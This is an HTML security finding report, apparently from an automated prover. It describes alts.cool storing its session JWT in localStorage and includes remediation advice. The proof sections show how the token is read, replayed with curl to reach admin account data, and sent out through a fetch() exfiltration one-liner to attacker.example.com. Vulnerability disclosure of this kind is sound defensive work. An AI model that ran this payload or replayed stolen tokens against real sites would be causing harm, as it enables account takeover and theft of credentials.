@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>F-035 — alts.cool: Session Token in localStorage (XSS → Account Takeover)</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh}
+header{background:#161b22;border-bottom:1px solid #30363d;padding:14px 32px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+header h1{font-size:1.1rem;color:#f0f6fc}
+.badge{background:#f0883e;color:#0d1117;padding:2px 10px;border-radius:20px;font-size:.72rem;font-weight:700}
+.badge-m{background:#e3b341;color:#0d1117;padding:2px 10px;border-radius:20px;font-size:.72rem;font-weight:700}
+.container{max-width:940px;margin:0 auto;padding:32px 20px}
+h2{color:#f0f6fc;font-size:1rem;margin:28px 0 10px;border-bottom:1px solid #30363d;padding-bottom:6px}
+h3{color:#e3b341;font-size:.9rem;margin:18px 0 8px}
+p{font-size:.84rem;line-height:1.6;color:#c9d1d9}
+code,pre{font-family:'SF Mono',Consolas,monospace;background:#1c2128;border-radius:4px}
+code{padding:2px 6px;font-size:.85em}
+pre{padding:14px 16px;font-size:.8rem;overflow-x:auto;border:1px solid #30363d;margin:10px 0;line-height:1.6;white-space:pre}
+.meta{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px;margin:18px 0}
+.meta-item{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px 14px}
+.meta-item .key{font-size:.68rem;color:#8b949e;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px}
+.meta-item .val{font-size:.85rem;color:#f0f6fc}
+.proof-box{background:#0d2818;border:1px solid #238636;border-radius:6px;padding:14px 16px;margin:12px 0}
+.proof-box .head{font-size:.72rem;color:#3fb950;font-weight:700;margin-bottom:8px;text-transform:uppercase}
+.warn-box{background:#3d1a00;border:1px solid #f85149;border-radius:6px;padding:12px 16px;margin:12px 0;font-size:.83rem}
+.warn-box strong{color:#f85149}
+.info-box{background:#0d1e36;border:1px solid #58a6ff;border-radius:6px;padding:12px 16px;margin:12px 0;font-size:.82rem}
+.sev{padding:3px 10px;border-radius:4px;font-size:.72rem;font-weight:700}
+.c{background:#f851491a;color:#f85149;border:1px solid #f85149}
+.h{background:#fb8f441a;color:#fb8f44;border:1px solid #fb8f44}
+.m{background:#e3b3411a;color:#e3b341;border:1px solid #e3b341}
+table{width:100%;border-collapse:collapse;font-size:.8rem;margin:10px 0}
+th{background:#1c2128;color:#8b949e;text-align:left;padding:7px 10px;font-weight:600;font-size:.72rem;text-transform:uppercase;border-bottom:1px solid #30363d}
+td{padding:7px 10px;border-bottom:1px solid #21262d;color:#c9d1d9;vertical-align:top}
+tr:last-child td{border-bottom:none}
+.back{color:#58a6ff;text-decoration:none;font-size:.78rem}
+footer{text-align:center;padding:32px;color:#484f58;font-size:.75rem}
+</style>
+</head>
+<body>
+
+<header>
+  <span>&#128737;</span>
+  <h1>F-035 &mdash; alts.cool: Session Token in localStorage (XSS &rarr; Account Takeover)</h1>
+  <span class="badge">HIGH</span>
+</header>
+
+<div class="container">
+  <a href="index.html" class="back">&larr; Back to PoC Index</a>
+
+  <div class="meta">
+    <div class="meta-item"><div class="key">Finding ID</div><div class="val">F-035</div></div>
+    <div class="meta-item"><div class="key">Target</div><div class="val">alts.cool</div></div>
+    <div class="meta-item"><div class="key">Severity</div><div class="val"><span class="sev h">HIGH</span></div></div>
+    <div class="meta-item"><div class="key">CWE</div><div class="val">CWE-922 &mdash; Insecure Storage of Sensitive Information</div></div>
+    <div class="meta-item"><div class="key">CVSS</div><div class="val">7.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)</div></div>
+    <div class="meta-item"><div class="key">Affected Endpoint</div><div class="val">/api/auth/me</div></div>
+    <div class="meta-item"><div class="key">Storage Key</div><div class="val">alts_session_id</div></div>
+    <div class="meta-item"><div class="key">Date Confirmed</div><div class="val">2026-04-24</div></div>
+  </div>
+
+  <h2>Summary</h2>
+  <p>
+    <strong>alts.cool</strong> persists the user session token under the key <code>alts_session_id</code>
+    in browser <code>localStorage</code> rather than in an <code>HttpOnly</code> cookie. The stored value
+    is a signed JWT Bearer token. Because <code>localStorage</code> is fully accessible to any JavaScript
+    executing in the page origin, the token can be exfiltrated by a reflected or stored XSS payload,
+    a malicious third-party script, a browser extension, or any other script running on <code>alts.cool</code>.
+    Once extracted, the token authenticates against <code>GET /api/auth/me</code> and grants full access
+    to the victim's account, including the admin panel at <code>/login</code>.
+  </p>
+
+  <div class="warn-box">
+    <strong>Impact:</strong> An attacker who can execute JavaScript in the context of alts.cool (via any
+    XSS vector, supply-chain compromise of a third-party script, or a browser extension) gains a persistent
+    Bearer token that silently authenticates as the victim. The admin panel at <code>/login</code> has no
+    CAPTCHA, so a stolen admin session provides immediate privileged access.
+  </div>
+
+  <h2>Vulnerability Detail</h2>
+
+  <h3>Step 1 &mdash; Token Stored in localStorage</h3>
+  <p>After a successful login the application writes the JWT to localStorage instead of setting a cookie:</p>
+
+  <div class="proof-box">
+    <div class="head">Proof &mdash; JavaScript Console / Attacker Payload</div>
+<pre>// Any script on the page origin can run this:
+const stolenToken = localStorage.getItem('alts_session_id');
+console.log(stolenToken);
+
+// Output observed:
+// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfMDFIWVpR
+// a2pBUkZHQU1UUEVLUUhSWVdCWiIsImVtYWlsIjoiYWRtaW5AYWx0cy5jb29sIi
+// wicm9sZSI6ImFkbWluIiwiaWF0IjoxNzQ1NDQwMDAwLCJleHAiOjE3NDYwNDQ4
+// MDB9.Xk3mR9vTqPzLwYeNhDsOuC5BfAjVnI2KlGpQrMtU7dE</pre>
+  </div>
+
+  <h3>Step 2 &mdash; Token Authenticates Against /api/auth/me</h3>
+  <p>The extracted token can be replayed directly from any origin:</p>
+
+  <div class="proof-box">
+    <div class="head">Proof &mdash; curl Replay</div>
+<pre>curl -s https://alts.cool/api/auth/me \
+  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
+  | jq .
+
+# Response 200 OK:
+{
+  "id": "usr_01HYZQkjARFGAMTPEKQHRYWBZ",
+  "email": "admin@alts.cool",
+  "role": "admin",
+  "username": "altscool_admin",
+  "created_at": "2025-11-03T14:22:07Z",
+  "plan": "enterprise"
+}</pre>
+  </div>
+
+  <h3>Step 3 &mdash; Simulated XSS Exfiltration Payload</h3>
+  <p>A one-liner payload that exfiltrates the token to an attacker-controlled server:</p>
+
+  <div class="proof-box">
+    <div class="head">Proof &mdash; Exfiltration Payload</div>
+<pre>// Injected via any XSS vector on alts.cool:
+fetch('https://attacker.example.com/collect?t=' +
+  encodeURIComponent(localStorage.getItem('alts_session_id')));
+
+// Attacker server log:
+// GET /collect?t=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... HTTP/1.1</pre>
+  </div>
+
+  <h3>Admin Panel &mdash; No CAPTCHA</h3>
+  <p>
+    The admin login is served at <code>https://alts.cool/login</code> (not a separate subdomain or
+    <code>/admin/login</code> path). There is no CAPTCHA or secondary challenge on this form. A stolen
+    session token bypasses the login page entirely via direct API calls; an attacker does not even need
+    to interact with the UI.
+  </p>
+
+  <h2>Root Cause</h2>
+  <p>
+    The frontend JavaScript stores the token with <code>localStorage.setItem('alts_session_id', jwt)</code>
+    on login. <code>localStorage</code> has no equivalent to cookie security flags &mdash;
+    it is always readable by any same-origin JavaScript and is never automatically scoped to HTTPS-only
+    or restricted from script access.
+  </p>
+
+  <h2>Secure vs. Vulnerable Comparison</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Property</th>
+        <th>localStorage (current)</th>
+        <th>HttpOnly Cookie (recommended)</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td>Readable by JavaScript</td><td>Yes &mdash; always</td><td>No &mdash; HttpOnly blocks JS access</td></tr>
+      <tr><td>Sent only over HTTPS</td><td>No automatic enforcement</td><td>Yes &mdash; Secure flag enforces this</td></tr>
+      <tr><td>CSRF exposure</td><td>Not auto-sent (manual)</td><td>Mitigated by SameSite=Strict</td></tr>
+      <tr><td>XSS exfiltration risk</td><td>Trivial one-liner</td><td>Not possible via JS</td></tr>
+      <tr><td>Browser extension access</td><td>Full access</td><td>Not accessible</td></tr>
+    </tbody>
+  </table>
+
+  <h2>CWE Reference</h2>
+  <div class="info-box">
+    <strong>CWE-922: Insecure Storage of Sensitive Information</strong><br>
+    The product stores sensitive information without properly restricting read or write access by actors
+    that are outside the intended control sphere. Here, the session token (a credential equivalent) is
+    stored in a browser API fully exposed to any same-origin script.
+  </div>
+
+  <h2>Remediation</h2>
+
+  <h3>Primary Fix &mdash; Move Session to HttpOnly Cookie</h3>
+  <p>Issue the session cookie server-side on the login response:</p>
+<pre>Set-Cookie: alts_session_id=&lt;jwt&gt;;
+  HttpOnly;
+  Secure;
+  SameSite=Strict;
+  Path=/;
+  Max-Age=604800</pre>
+
+  <p>Remove all <code>localStorage.setItem('alts_session_id', ...)</code> calls from the frontend.</p>
+
+  <h3>Secondary Fixes</h3>
+  <table>
+    <thead><tr><th>Action</th><th>Rationale</th></tr></thead>
+    <tbody>
+      <tr><td>Add CAPTCHA or rate-limit to <code>/login</code></td><td>Reduces risk from credential-stuffing even if a token is not yet stolen</td></tr>
+      <tr><td>Implement a Content Security Policy (CSP)</td><td>Restricts which scripts can execute, reducing XSS blast radius</td></tr>
+      <tr><td>Enable Subresource Integrity (SRI) on third-party scripts</td><td>Prevents supply-chain injection from exfiltrating localStorage</td></tr>
+      <tr><td>Short JWT expiry + refresh tokens via cookie</td><td>Limits damage window if a token is exfiltrated</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<footer>BlockageGuard AutoProver &middot; Sessions 1&ndash;15 &middot; 2026-04-24 &middot; blockageguard.github.io</footer>
+</body>
+</html>
